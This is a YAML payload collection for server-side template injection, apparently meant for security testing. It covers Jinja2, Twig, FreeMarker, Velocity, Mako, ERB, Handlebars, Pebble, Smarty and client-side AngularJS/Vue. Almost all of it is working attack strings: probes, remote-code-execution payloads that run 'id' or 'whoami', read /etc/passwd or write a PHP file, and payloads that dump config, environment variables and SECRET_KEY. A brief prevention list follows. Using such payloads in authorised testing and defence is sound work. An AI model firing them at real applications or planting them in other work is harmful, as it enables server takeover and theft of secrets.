# A05:2025 - Injection - Server-Side Template Injection (SSTI) Payloads
# CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine

payload_category: "ssti"
owasp_2025: "A05"
cwe: "CWE-1336"
severity: "CRITICAL"

# ===== DETECTION / POLYGLOT =====
detection:
  math_probes:
    - "{{7*7}}"
    - "${7*7}"
    - "<%= 7*7 %>"
    - "#{7*7}"
    - "{7*7}"
    - "{{7*'7'}}"
    - "*{7*7}"

  string_probes:
    - "{{\"foo\"}}"
    - "${\"foo\"}"
    - "<%= \"foo\" %>"
    - "#{\"foo\"}"

  polyglot:
    - "${{<%[%'\"}}%\\."
    - "{{constructor.constructor('return this')()}}"

# ===== JINJA2 (Python / Flask) =====
jinja2:
  detection:
    - "{{7*7}}"
    - "{{7*'7'}}"
    - "{{config}}"
    - "{{request.environ}}"

  rce:
    - "{{''.__class__.__mro__[1].__subclasses__()}}"
    - "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}"
    - "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
    - "{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__init__.__globals__['os'].popen('whoami').read()}}"
    - "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{{c.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}"

  info_disclosure:
    - "{{config.items()}}"
    - "{{request.environ}}"
    - "{{self.__dict__}}"
    - "{{settings.SECRET_KEY}}"

# ===== TWIG (PHP / Symfony) =====
twig:
  detection:
    - "{{7*7}}"
    - "{{7*'7'}}"
    - "{{dump(app)}}"

  rce:
    - "{{_self.env.registerUndefinedFilterCallback('exec')}}"
    - "{{_self.env.getFilter('id')}}"
    - "{{['id']|filter('system')}}"
    - "{{[\"id\"]|map(\"system\")|join}}"

  info_disclosure:
    - "{{app.request.server.all|join(',')}}"
    - "{{dump(app)}}"

# ===== FREEMARKER (Java) =====
freemarker:
  detection:
    - "${7*7}"
    - "${\"freemarker.template.utility.Execute\"?new()(\"id\")}"

  rce:
    - "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"
    - "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"whoami\")}"
    - "[#assign ex='freemarker.template.utility.Execute'?new()]${ex('id')}"
    - "${\"freemarker.template.utility.ObjectConstructor\"?new()(\"java.lang.Runtime\").getRuntime().exec(\"id\")}"

# ===== VELOCITY (Java) =====
velocity:
  detection:
    - "#set($x = 7 * 7)$x"

  rce:
    - "#set($e=\"\")#foreach($c in [1..$e.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").waitFor()])$c#end"

# ===== MAKO (Python) =====
mako:
  detection:
    - "${7*7}"
    - "<% import os %><%=os.popen('id').read()%>"

  rce:
    - "<%import os%>${os.popen('whoami').read()}"
    - "<%import subprocess%>${subprocess.check_output('id',shell=True)}"

# ===== ERB (Ruby / Rails) =====
erb:
  detection:
    - "<%= 7*7 %>"
    - "<%= system('id') %>"

  rce:
    - "<%= `id` %>"
    - "<%= system('cat /etc/passwd') %>"
    - "<%= IO.popen('id').read() %>"
    - "<%= `whoami` %>"

# ===== HANDLEBARS (Node.js) =====
handlebars:
  detection:
    - "{{this}}"
    - "{{this.constructor}}"

  rce:
    - "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('whoami');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}"

# ===== PEBBLE (Java) =====
pebble:
  detection:
    - "{{7*7}}"

  rce:
    - "{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}{{(1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes] as byte[][]))}}"

# ===== SMARTY (PHP) =====
smarty:
  detection:
    - "{7*7}"
    - "{php}echo 'test';{/php}"

  rce:
    - "{system('id')}"
    - "{php}system('whoami');{/php}"
    - "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php system('id');?>\",self::clearConfig())}"

# ===== CLIENT-SIDE =====
angularjs:
  - "{{constructor.constructor('alert(1)')()}}"
  - "{{$on.constructor('alert(1)')()}}"
  - "{{toString().constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}"

vuejs:
  - "{{constructor.constructor('alert(1)')()}}"
  - "{{_c.constructor('alert(1)')()}}"

prevention:
  - "Never pass user input directly into templates"
  - "Use template engines in sandboxed mode"
  - "Input validation and sanitization"
  - "Use logic-less templates when possible (Mustache)"
  - "Restrict template engine functions and methods"
  - "Use auto-escaping features"

references:
  - "OWASP Top 10:2025 A05"
  - "CWE-1336: SSTI"
  - "PortSwigger: Server-side template injection"
  - "PayloadsAllTheThings: SSTI"
  - "HackTricks: SSTI"
